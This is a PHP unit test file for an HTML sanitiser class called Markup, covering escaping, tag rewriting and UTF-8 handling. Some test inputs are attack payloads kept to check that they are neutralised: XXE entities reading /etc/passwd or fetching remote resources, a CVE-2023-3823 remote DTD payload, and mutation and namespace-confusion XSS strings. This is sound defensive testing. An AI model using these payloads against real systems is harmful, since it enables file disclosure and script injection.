<?php namespace de\thekid\crews\unittest;

use de\thekid\crews\Markup;
use test\verify\Runtime;
use test\{Assert, Test, Values};

class MarkupTest {

  #[Test]
  public function can_create() {
    new Markup();
  }

  #[Test]
  public function empty_text() {
    Assert::equals('', new Markup()->transform(''));
  }

  #[Test]
  public function whitespace_only() {
    Assert::equals("\r\n\t ", new Markup()->transform("\r\n\t "));
  }

  #[Test]
  public function text() {
    Assert::equals('This is a test', new Markup()->transform('This is a test'));
  }

  #[Test]
  public function markup() {
    Assert::equals('This <b>is</b> a test', new Markup()->transform('This <b>is</b> a test'));
  }

  #[Test, Values([
    ['<strong>test</strong>', '<b>test</b>'],
    ['<em>test</em>', '<i>test</i>'],
  ])]
  public function rewrites($input, $expected) {
    Assert::equals($expected, new Markup()->transform($input));
  }

  #[Test, Values([
    ['1 < 2'],
    ['1 & 2'],
    ['Test <&">&euro;&unknown; Works'],
  ])]
  public function does_not_contain_unescaped_entities($input) {
    $transformed= new Markup()->transform($input);

    foreach (['/</', '/>/', '/"/', '/&(?![a-z]+;)/'] as $pattern) {
      Assert::equals(0, preg_match($pattern, new Markup()->transform($input)));
    }
  }

  #[Test]
  public function html_entities_are_escaped() {
    Assert::equals(
      'Test &lt;&amp;&quot;&gt;€&amp;unknown; Works',
      new Markup()->transform('Test &lt;&amp;&quot;&gt;&euro;&unknown; Works')
    );
  }

  #[Test, Values([
    ['Übercoder'],
    ['👉🙂'],
    ['中国'],  // "China"
  ])]
  public function loads_utf8($input) {
    Assert::equals($input, new Markup()->transform($input));
  }

  #[Test, Values([
    ['<script>console.log("Test");</script>'],
    ['<script type="module">console.log("Test");</script>'],
    ['<SCRIPT>console.log("Test");</SCRIPT>'],
    ['<Script>console.log("Test");</Script>'],
  ])]
  public function removes_script_tags($input) {
    Assert::equals('', new Markup()->transform($input));
  }

  #[Test]
  public function removes_unsupported_attributes() {
    Assert::equals(
      '<a href="/&quot;">test</a>',
      new Markup()->transform('<a href="/&quot;" target="_new">test</a>')
    );
  }

  #[Test]
  public function removes_divs() {
    Assert::equals(
      'The container is gone',
      new Markup()->transform('<div>The container is gone</div>')
    );
  }

  #[Test]
  public function removes_comments() {
    Assert::equals(
      'The  is gone',
      new Markup()->transform('The <!-- comment --> is gone')
    );
  }

  #[Test, Values([
    ['<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/logs">'],
    ['<!ENTITY xxe SYSTEM "http://example.com/entity1.xml">'],
    ['<!ENTITY xxe SYSTEM "/etc/passwd">'],
  ])]
  public function does_not_parse_doctype_with($entity) {
    Assert::equals(
      "]&gt;\n<p>&amp;xxe;</p>",
      new Markup()->transform("<!DOCTYPE results [{$entity}]>\n<p>&xxe;</p>"),
    );
  }

  #[Test]
  public function CVE_2023_3823() {
    $entity= '<!ENTITY % remote SYSTEM "https://bin.icewind.me/r/p0gzLJ"> %remote; %intern; n%trick;';
    Assert::equals(
      ' %remote; %intern; n%trick;]&gt;',
      new Markup()->transform("<!DOCTYPE root [{$entity}]>"),
    );
  }

  #[Test, Runtime(php: '<8.4-dev')]
  public function svg_mutation_xss_html4() {
    $exploit= '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">';
    Assert::equals('&lt;a id=&quot;&quot;&gt;', new Markup()->transform($exploit));
  }

  #[Test, Runtime(php: '>=8.4-dev')]
  public function svg_mutation_xss_html5() {
    $exploit= '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">';
    Assert::equals('', new Markup()->transform($exploit));
  }

  #[Test, Runtime(php: '<8.4-dev')]
  public function namespace_confusion_xss_html4() {
    $exploit= '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>';
    Assert::equals('&lt;img src onerror=alert(1)&gt;', new Markup()->transform($exploit));
  }

  #[Test, Runtime(php: '>=8.4-dev')]
  public function namespace_confusion_xss_html5() {
    $exploit= '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>';
    Assert::equals(
      '&lt;/math&gt;&lt;img src onerror=alert(1)&gt;&lt;/body&gt;&lt;/html&gt;',
      new Markup()->transform($exploit),
    );
  }
}